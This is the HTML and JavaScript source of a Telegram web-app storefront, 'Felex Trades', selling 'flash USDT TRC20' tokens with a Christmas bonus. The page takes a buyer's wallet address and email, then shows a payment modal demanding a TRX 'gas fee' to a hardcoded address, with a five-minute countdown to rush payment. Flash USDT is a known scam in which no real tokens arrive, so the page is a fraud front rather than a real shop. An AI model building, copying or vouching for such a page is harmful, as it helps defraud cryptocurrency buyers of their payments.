<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#1a1a2e">
    <title>flash USDT TRC20 - Buy Now</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="assets/style.css">
    <style>
        /* Payment Modal Professional Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(6px);
        }
        
        .modal-content {
            position: relative;
            background: linear-gradient(145deg, #1a1a2e 0%, #16162a 100%);
            border-radius: 20px;
            padding: 28px;
            max-width: 400px;
            width: 90%;
            margin: 20px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.08);
            animation: modalSlideIn 0.3s ease;
        }
        
        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 22px;
            padding-bottom: 18px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
        
        .modal-header h2 {
            font-size: 1.2rem;
            font-weight: 600;
            color: #fff;
            margin: 0;
        }
        
        .timer-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            background: rgba(255, 71, 87, 0.15);
            color: #ff6b7a;
            padding: 8px 14px;
            border-radius: 25px;
            font-weight: 700;
            font-size: 0.9rem;
            font-variant-numeric: tabular-nums;
            border: 1px solid rgba(255, 71, 87, 0.3);
        }
        
        .timer-badge svg {
            animation: timerPulse 1s infinite;
        }
        
        @keyframes timerPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .qr-code-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 22px;
        }
        
        .qr-code-label {
            font-size: 0.75rem;
            color: #6b6b8a;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-weight: 600;
        }
        
        .qr-code-wrapper {
            position: relative;
            padding: 12px;
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .qr-code {
            width: 180px;
            height: 180px;
            border-radius: 10px;
            display: block;
        }
        
        .payment-info {
            text-align: center;
            margin-bottom: 20px;
            padding: 20px;
            background: rgba(38, 161, 123, 0.08);
            border-radius: 14px;
            border: 1px solid rgba(38, 161, 123, 0.15);
        }
        
        .payment-info p {
            font-size: 0.8rem;
            color: #6b6b8a;
            margin: 0 0 8px 0;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }
        
        .amount-display {
            font-size: 1.6rem;
            font-weight: 700;
            color: #26A17B;
            font-family: 'SF Mono', 'Consolas', monospace;
        }
        
        .payment-address {
            margin-bottom: 20px;
        }
        
        .payment-address p {
            font-size: 0.8rem;
            color: #6b6b8a;
            margin: 0 0 10px 0;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }
        
        .address-box {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 12px;
            padding: 14px;
            cursor: pointer;
            transition: all 0.25s ease;
        }
        
        .address-box:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(38, 161, 123, 0.4);
            transform: translateY(-1px);
        }
        
        .address-box:active {
            transform: scale(0.98);
        }
        
        .address-box.copied {
            background: rgba(38, 161, 123, 0.15);
            border-color: rgba(38, 161, 123, 0.5);
        }
        
        .address-box code {
            flex: 1;
            font-family: 'SF Mono', 'Consolas', 'Monaco', monospace;
            font-size: 0.75rem;
            color: #e0e0e8;
            word-break: break-all;
            line-height: 1.4;
        }
        
        .copy-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 38px;
            height: 38px;
            background: rgba(38, 161, 123, 0.15);
            border: 1px solid rgba(38, 161, 123, 0.3);
            border-radius: 10px;
            cursor: pointer;
            color: #26A17B;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .copy-btn:hover {
            background: rgba(38, 161, 123, 0.25);
            border-color: rgba(38, 161, 123, 0.5);
        }
        
        .copy-btn svg {
            width: 18px;
            height: 18px;
        }
        
        .copy-btn svg.check-icon {
            display: none;
        }
        
        .address-box.copied .copy-btn {
            background: rgba(38, 161, 123, 0.3);
            border-color: #26A17B;
        }
        
        .address-box.copied .copy-btn .copy-icon {
            display: none;
        }
        
        .address-box.copied .copy-btn .check-icon {
            display: block;
        }
        
        .copy-hint {
            display: block;
            text-align: center;
            font-size: 0.75rem;
            color: #5a5a75;
            margin-top: 8px;
            font-weight: 500;
        }
        
        .order-summary {
            background: rgba(255, 255, 255, 0.04);
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }
        
        .order-summary p {
            margin: 8px 0;
            font-size: 0.85rem;
            color: #a0a0b8;
        }
        
        .order-summary p strong {
            color: #e0e0e8;
            font-weight: 600;
        }
        
        .order-summary span {
            color: #fff;
            font-weight: 500;
        }
        
        .warning-box {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.25);
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 20px;
        }
        
        .warning-box svg {
            color: #ffc857;
            flex-shrink: 0;
        }
        
        .warning-box span {
            font-size: 0.85rem;
            color: #ffd666;
            font-weight: 500;
        }
        
        .btn-secondary {
            width: 100%;
            padding: 16px 24px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 12px;
            color: #b0b0c0;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
        }
        
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.12);
            color: #fff;
            border-color: rgba(255, 255, 255, 0.25);
            transform: translateY(-1px);
        }
        
        .btn-secondary:active {
            transform: scale(0.98);
        }
        
        /* Success Modal */
        .success-content {
            text-align: center;
            padding: 35px 25px;
        }
        
        .success-icon {
            width: 60px;
            height: 60px;
            background: rgba(38, 161, 123, 0.15);
            border: 2px solid #26A17B;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 18px;
            font-size: 1.6rem;
            color: #26A17B;
        }
        
        .success-content h2 {
            color: #fff;
            margin: 0 0 12px 0;
        }
        
        .success-content p {
            color: #8b8b9e;
            margin: 10px 0;
            line-height: 1.5;
        }
        
        .order-id-display {
            background: rgba(255, 255, 255, 0.05);
            padding: 12px 18px;
            border-radius: 10px;
            margin: 18px 0 !important;
        }
        
        .order-id-display strong {
            color: #26A17B;
            font-family: 'SF Mono', 'Consolas', monospace;
        }
        
        /* Toast Notification */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: linear-gradient(135deg, #26A17B 0%, #1d8a65 100%);
            color: #fff;
            padding: 14px 28px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 0.9rem;
            box-shadow: 0 10px 40px rgba(38, 161, 123, 0.4);
            z-index: 2000;
            opacity: 0;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }
        
        .toast.error {
            background: linear-gradient(135deg, #ff4757 0%, #e63946 100%);
            box-shadow: 0 10px 40px rgba(255, 71, 87, 0.4);
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                    <circle cx="16" cy="16" r="16" fill="#26A17B"/>
                    <path d="M17.5 8H14.5V14H8V17H14.5V24H17.5V17H24V14H17.5V8Z" fill="white"/>
                </svg>
                <span>Felex Trades</span>
            </div>
            <div class="user-info">
                <span id="userName">Guest</span>
                <div class="christmas-badge">🎄 XMAS</div>
            </div>
        </header>

        <!-- Hero Section -->
        <section class="hero">
            <h1>BUY FLASH USDT TRC20 NETWORK</h1>
            <p class="subtitle">200 Days validity Support Gaming and Trading only</p>
            <div class="rate-badge">1 USDT = 0.01 TRX Gas</div>
        </section>

        <!-- Christmas Offer Banner -->
        <div class="offer-banner">
            <div class="offer-icon">🎁</div>
            <div class="offer-content">
                <strong>Christmas Special!</strong>
                <p>Buy 10,000 USDT & Get 3,000 FREE!</p>
            </div>
        </div>

        <!-- Calculator Form -->
        <section class="calculator-section">
            <form id="orderForm" onsubmit="return false;">
                <div class="input-group">
                    <label for="usdtAmount">USDT Amount</label>
                    <input type="number" id="usdtAmount" name="amount" placeholder="Enter amount" min="1000" step="1" inputmode="numeric" autocomplete="off">
                    <span class="input-hint" id="amountHint">Minimum: 1,000 USDT</span>
                </div>

                <div class="input-group">
                    <label for="walletAddress">Your TRC20 Wallet Address</label>
                    <input type="text" id="walletAddress" name="wallet" placeholder="T..." maxlength="34" autocomplete="off" spellcheck="false">
                    <span class="input-hint" id="walletHint">Enter your USDT TRC20 receiving address</span>
                </div>

                <div class="input-group">
                    <label for="emailAddress">Email Address</label>
                    <input type="email" id="emailAddress" name="email" placeholder="your@email.com" autocomplete="email">
                    <span class="input-hint" id="emailHint">For order confirmation</span>
                </div>

                <!-- Summary Card -->
                <div class="summary-card">
                    <div class="summary-row">
                        <span>You Receive:</span>
                        <span id="receiveAmount" class="highlight-green">0 USDT</span>
                    </div>
                    <div class="summary-row bonus-row" id="bonusRow" style="display:none;">
                        <span>Christmas Bonus:</span>
                        <span class="highlight-gold">+3,000 USDT FREE</span>
                    </div>
                    <div class="summary-row total-row">
                        <span>Total USDT:</span>
                        <span id="totalUsdt" class="highlight-green">0 USDT</span>
                    </div>
                    <hr>
                    <div class="summary-row">
                        <span>Gas Fee to Pay:</span>
                        <span id="trxAmount" class="highlight-red">0 TRX</span>
                    </div>
                </div>

                <button type="button" class="btn-primary" id="buyBtn" disabled>
                    <span id="buyBtnText">Buy USDT Now</span>
                    <svg id="buyBtnIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M5 12h14M12 5l7 7-7 7"/>
                    </svg>
                    <div class="spinner" id="buyBtnSpinner" style="display:none;"></div>
                </button>
            </form>
        </section>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-links">
                <a href="javascript:void(0)" onclick="showTerms()">Terms</a>
                <span class="divider">|</span>
                <a href="javascript:void(0)" onclick="showSupport()">Support</a>
            </div>
            <p class="copyright">&copy; 2025 FELEX TRADES. All rights reserved.</p>
        </footer>
    </div>

    <!-- Payment Modal -->
    <div class="modal" id="paymentModal">
        <div class="modal-overlay" onclick="closeModal()"></div>
        <div class="modal-content">
            <div class="modal-header">
                <h2>Complete Payment</h2>
                <div class="timer-badge" id="timerBadge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="12" cy="12" r="10"/>
                        <path d="M12 6v6l4 2"/>
                    </svg>
                    <span id="countdown">05:00</span>
                </div>
            </div>

            <div class="payment-details">
                <p class="qr-code-label">Scan to Pay</p>
                <div class="qr-code-container">
                    <div class="qr-code-wrapper">
                        <img src="https://felexs.trushme.top/pp/img/qr.png" alt="Payment QR Code" class="qr-code" onerror="this.style.display='none'">
                    </div>
                </div>

                <div class="payment-info">
                    <p>Send exactly</p>
                    <div class="amount-display" id="payTrxAmount">0 TRX</div>
                </div>

                <div class="payment-address">
                    <p>TRC20 Address</p>
                    <div class="address-box" id="addressBox" onclick="copyAddress()">
                        <code id="paymentAddress">TN6uppBvwVPpWXrhf8vdvcoKu3MtonjcVL</code>
                        <button type="button" class="copy-btn" title="Copy Address">
                            <svg class="copy-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="9" y="9" width="13" height="13" rx="2"/>
                                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
                            </svg>
                            <svg class="check-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                                <path d="M20 6L9 17l-5-5"/>
                            </svg>
                        </button>
                    </div>
                    <span class="copy-hint" id="copyHint">Tap to copy</span>
                </div>

                <div class="order-summary">
                    <p><strong>Order Details:</strong></p>
                    <p>Order ID: <span id="modalOrderId">-</span></p>
                    <p>Amount: <span id="modalUsdt">0</span> USDT</p>
                    <p>Wallet: <span id="modalWallet">-</span></p>
                    <p>Email: <span id="modalEmail">-</span></p>
                </div>

                <div class="warning-box">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
                        <line x1="12" y1="9" x2="12" y2="13"/>
                        <line x1="12" y1="17" x2="12.01" y2="17"/>
                    </svg>
                    <span>Complete payment within 5 minutes!</span>
                </div>

                <button type="button" class="btn-secondary" onclick="closeModal()">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Success Modal -->
    <div class="modal" id="successModal">
        <div class="modal-overlay" onclick="closeSuccessModal()"></div>
        <div class="modal-content success-content">
            <div class="success-icon">✓</div>
            <h2>Order Submitted!</h2>
            <p>Your order has been received. We will verify your payment and process your order shortly.</p>
            <p class="order-id-display">Order ID: <strong id="successOrderId">-</strong></p>
            <button type="button" class="btn-primary" onclick="closeSuccessModal()">Done</button>
        </div>
    </div>

    <!-- Toast Notification -->
    <div class="toast" id="toast">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
            <path d="M20 6L9 17l-5-5"/>
        </svg>
        <span id="toastMessage">Copied to clipboard!</span>
    </div>

    <script src="assets/app.js"></script>
    <script>
        // Timer variables
        let timeRemaining = 300;
        let timerInterval = null;

        function updateTimer() {
            const minutes = Math.floor(timeRemaining / 60);
            const seconds = timeRemaining % 60;
            const display = minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
            document.getElementById('countdown').textContent = display;
            
            if (timeRemaining <= 60) {
                document.getElementById('timerBadge').style.background = 'rgba(255, 71, 87, 0.25)';
                document.getElementById('timerBadge').style.color = '#ff6b7a';
                document.getElementById('timerBadge').style.borderColor = 'rgba(255, 71, 87, 0.4)';
            }
            
            if (timeRemaining <= 0) {
                clearInterval(timerInterval);
                showToast('Payment time expired!', 'error');
                setTimeout(function() {
                    closeModal();
                }, 2000);
            }
            
            timeRemaining--;
        }

        function startTimer() {
            timeRemaining = 300;
            updateTimer();
            timerInterval = setInterval(updateTimer, 1000);
        }

        function stopTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
        }

        function copyAddress() {
            const address = document.getElementById('paymentAddress').textContent;
            const addressBox = document.getElementById('addressBox');
            const copyHint = document.getElementById('copyHint');
            
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(address).then(function() {
                    addressBox.classList.add('copied');
                    copyHint.textContent = 'Copied!';
                    showToast('Address copied!');
                    setTimeout(function() {
                        addressBox.classList.remove('copied');
                        copyHint.textContent = 'Tap to copy';
                    }, 3000);
                }).catch(function() {
                    fallbackCopy(address, addressBox, copyHint);
                });
            } else {
                fallbackCopy(address, addressBox, copyHint);
            }
        }

        function fallbackCopy(address, addressBox, copyHint) {
            const textarea = document.createElement('textarea');
            textarea.value = address;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            
            addressBox.classList.add('copied');
            copyHint.textContent = 'Copied!';
            showToast('Address copied!');
            setTimeout(function() {
                addressBox.classList.remove('copied');
                copyHint.textContent = 'Tap to copy';
            }, 3000);
        }

        function showToast(message, type) {
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toastMessage');
            
            toastMessage.textContent = message;
            if (type === 'error') {
                toast.classList.add('error');
            } else {
                toast.classList.remove('error');
            }
            
            toast.classList.add('show');
            
            setTimeout(function() {
                toast.classList.remove('show');
            }, 3000);
        }

        function closeModal() {
            stopTimer();
            document.getElementById('paymentModal').classList.remove('active');
            document.getElementById('paymentModal').style.display = 'none';
        }

        function showPaymentModal() {
            startTimer();
            document.getElementById('paymentModal').style.display = 'flex';
            document.getElementById('paymentModal').classList.add('active');
        }
    </script>
</body>
</html>

